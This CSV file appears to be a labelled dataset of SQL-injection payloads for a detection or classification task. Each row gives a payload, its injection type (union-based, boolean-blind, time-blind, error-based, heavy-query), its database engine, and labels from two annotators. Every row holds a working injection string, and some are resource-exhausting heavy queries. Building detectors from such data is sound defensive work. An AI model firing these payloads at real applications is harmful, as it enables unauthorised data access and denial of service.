payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"-9353"" where 4607 = 4607 union all select 4607,4607,4607,4607,4607,4607#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1539,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9353"" where 4607 = 4607 union all select 4607,4607,4607,4607,4607,4607#"
"1%' ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( '%' = '",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,1540,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1%' ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( '%' = '"
"-4236 ) union all select 5260,5260,5260,5260,5260,5260,5260,5260,5260#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1541,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4236 ) union all select 5260,5260,5260,5260,5260,5260,5260,5260,5260#"
"1 ) ) ) union all select null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1542,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) ) ) union all select null,null,null,null,null,null,null#"
"1"" or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ""ncym"" like ""ncym",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1543,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1"" or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ""ncym"" like ""ncym"
-6423' ) or 6872 = 6872,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1544,boolean_blind,generic,Pattern match: 'or 6872 = 6872' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-6423' ) or 6872 = 6872
"1"" ) as zovk where 4591 = 4591 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.9,pg_sleep for PostgreSQL time blind,KEEP,,time_blind,postgresql,1545,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,"1"" ) as zovk where 4591 = 4591 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --"
"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1546,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--"
"1'+ ( select oqvo where 7448 = 7448 union all select null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1547,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1'+ ( select oqvo where 7448 = 7448 union all select null,null,null,null,null--"
"1 ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( 4348 = 4348",heavy_query,mysql,0.85,benchmark for heavy query,KEEP,,heavy_query,mysql,1548,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( 4348 = 4348"
1' ) ) as iuta where 1482 = 1482,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1549,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) as iuta where 1482 = 1482
"1"" ) ) ) waitfor delay '0:0:5'--",time_blind,mssql,0.9,waitfor delay MSSQL time blind,KEEP,,time_blind,mssql,1550,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,"1"" ) ) ) waitfor delay '0:0:5'--"
"1 ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,1551,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1 ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )"
1' ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( 'fuvv' = 'fuvv,time_blind,postgresql,0.9,pg_sleep for PostgreSQL time blind,KEEP,,time_blind,postgresql,1552,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1' ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( 'fuvv' = 'fuvv
"-4756%' ) ) union all select 7824,7824,7824,7824,7824,7824,7824,7824#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1553,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4756%' ) ) union all select 7824,7824,7824,7824,7824,7824,7824,7824#"
"1"" ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.9,pg_sleep for PostgreSQL time blind,KEEP,,time_blind,postgresql,1554,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,"1"" ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --"
"iif ( 1539 = 1539,1539,1/0 )",boolean_blind,mssql,0.85,iif() for MSSQL boolean blind,KEEP,,boolean_blind,mssql,1555,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"iif ( 1539 = 1539,1539,1/0 )"
1'+ ( select 'xqjx' where 7048 = 7048 and 9198 = 9198--,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1556,boolean_blind,generic,Pattern match: 'and 9198 = 9198' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1'+ ( select 'xqjx' where 7048 = 7048 and 9198 = 9198--
1'|| ( select 'feki' where 4082 = 4082 and ( 3587 = 4207 ) *4207 ) ||',boolean_blind,generic,0.8,SELECT CASE WHEN for blind,KEEP,,boolean_blind,generic,1557,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'|| ( select 'feki' where 4082 = 4082 and ( 3587 = 4207 ) *4207 ) ||'
"1"" ) as jiiq where 6847 = 6847",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1558,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) as jiiq where 6847 = 6847"
"1"" ) as zopq where 2680 = 2680",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1559,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) as zopq where 2680 = 2680"
"-8844"" ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,mysql,0.8,group by concat for boolean blind,KEEP,,boolean_blind,mysql,1560,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"-8844"" ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #"
1' or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and 'ukoc' like 'ukoc,time_blind,postgresql,0.9,pg_sleep for PostgreSQL time blind,KEEP,,time_blind,postgresql,1561,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1' or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and 'ukoc' like 'ukoc
"-4222' ) union all select 9267,9267,9267,9267,9267,9267--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1562,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4222' ) union all select 9267,9267,9267,9267,9267,9267--"
"-2375 union all select 1573,1573,1573,1573#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1563,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2375 union all select 1573,1573,1573,1573#"
"-7409"" ) ) union all select 3145,3145,3145--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1564,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7409"" ) ) union all select 3145,3145,3145--"
"-4926"" where 8152 = 8152 or 4339 = 5547#",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1565,boolean_blind,generic,Pattern match: 'or 4339 = 5547' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-4926"" where 8152 = 8152 or 4339 = 5547#"
select case when 7951 = 1147 then 1 else null end--,boolean_blind,generic,0.8,SELECT CASE WHEN for blind,KEEP,,boolean_blind,generic,1566,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select case when 7951 = 1147 then 1 else null end--
"select sleep ( 5 ) and ( ""tlbp"" = ""tlbp",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1567,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"select sleep ( 5 ) and ( ""tlbp"" = ""tlbp"
"1 union all select null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1568,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 union all select null,null,null#"
"1"" ) ) as tfjh where 1134 = 1134 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1569,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1"" ) ) as tfjh where 1134 = 1134 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
1' ) ) as qqvk where 1007 = 1007,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1570,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) as qqvk where 1007 = 1007
"( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6130 = 6130,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",boolean_blind,mysql,0.8,ELT IF for boolean blind,KEEP,,boolean_blind,mysql,1571,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6130 = 6130,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )"
-2050' union all select 5606#,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1572,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,-2050' union all select 5606#
-7199' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and 'qibr' = 'qibr,error_based,oracle,0.85,xmltype for error extraction,KEEP,,error_based,oracle,1573,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,-7199' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and 'qibr' = 'qibr
"-2256"" ) ) ) or 1971 = 4537#",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1574,boolean_blind,generic,Pattern match: 'or 1971 = 4537' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-2256"" ) ) ) or 1971 = 4537#"
"1%"" ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",heavy_query,mysql,0.85,benchmark for heavy query,KEEP,,heavy_query,mysql,1575,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1%"" ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #"
"1 ) ) as nlzg where 1482 = 1482 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",error_based,mysql,0.85,extractvalue for error extraction,KEEP,,error_based,mysql,1576,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 ) ) as nlzg where 1482 = 1482 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --"
1' where 2673 = 2673,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1577,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' where 2673 = 2673
"1"" ) where 2602 = 2602 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1578,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1"" ) where 2602 = 2602 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
"1"" ) ) and ( 3020 = 3020 ) *6703 and ( ( ""bely"" = ""bely",boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1579,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1"" ) ) and ( 3020 = 3020 ) *6703 and ( ( ""bely"" = ""bely"
"-5014"" ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""dkyp"" like ""dkyp",boolean_blind,mssql,0.8,CHAR case when for blind,KEEP,,boolean_blind,mssql,1580,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-5014"" ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""dkyp"" like ""dkyp"
1' ) ) and sleep ( 5 ) and ( ( 'jiio' like 'jiio,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1581,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1' ) ) and sleep ( 5 ) and ( ( 'jiio' like 'jiio
"make_set ( 7729 = 7729,1 )",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1582,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"make_set ( 7729 = 7729,1 )"
"-5637%"" ) ) ) or 6872 = 6872 and ( ( ( ""%"" = """,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1583,boolean_blind,generic,Pattern match: 'or 6872 = 6872' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-5637%"" ) ) ) or 6872 = 6872 and ( ( ( ""%"" = """
"1"" ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ""rqxd"" = ""rqxd",boolean_blind,mysql,0.8,ELT IF for boolean blind,KEEP,,boolean_blind,mysql,1584,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ""rqxd"" = ""rqxd"
( select ( case when ( 3348 = 1710 ) then 3348 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual ),boolean_blind,oracle,0.8,SELECT CASE WHEN for blind,KEEP,,boolean_blind,oracle,1585,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,( select ( case when ( 3348 = 1710 ) then 3348 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )
1' rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and 'xnap' = 'xnap,boolean_blind,generic,0.8,RLIKE case when for blind,KEEP,,boolean_blind,generic,1586,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1' rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and 'xnap' = 'xnap
"1' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'bkcs' = 'bkcs",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,1587,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'bkcs' = 'bkcs"
"1"" ) ) ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1588,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) ) ) union all select null,null,null,null,null,null,null,null--"
"1 ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1589,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1 ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )"
"1' ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",heavy_query,mysql,0.85,benchmark for heavy query,KEEP,,heavy_query,mysql,1590,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #"
"-6220' union all select 1462,1462#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1591,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6220' union all select 1462,1462#"
"1%"" ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""%"" = """,error_based,oracle,0.85,ctxsys.drithsx for error extraction,KEEP,,error_based,oracle,1592,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"1%"" ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""%"" = """
1 ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( 5171 = 5171,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1593,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1 ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( 5171 = 5171
"1"" ) ) as sgln where 7573 = 7573",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1594,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) ) as sgln where 7573 = 7573"
"1"" and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""bzzt"" like ""bzzt",boolean_blind,mssql,0.8,CHAR case when for blind,KEEP,,boolean_blind,mssql,1595,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""bzzt"" like ""bzzt"
"1"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ""vnei"" like ""vnei",heavy_query,mysql,0.85,benchmark for heavy query,KEEP,,heavy_query,mysql,1596,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ""vnei"" like ""vnei"
"1"" ) ) as puws where 7006 = 7006",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1597,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) ) as puws where 7006 = 7006"
"select sleep ( 5 ) and ( ""zsjw"" like ""zsjw",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1598,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"select sleep ( 5 ) and ( ""zsjw"" like ""zsjw"
"-7485"" ) ) as caob where 4100 = 4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1599,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7485"" ) ) as caob where 4100 = 4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--"
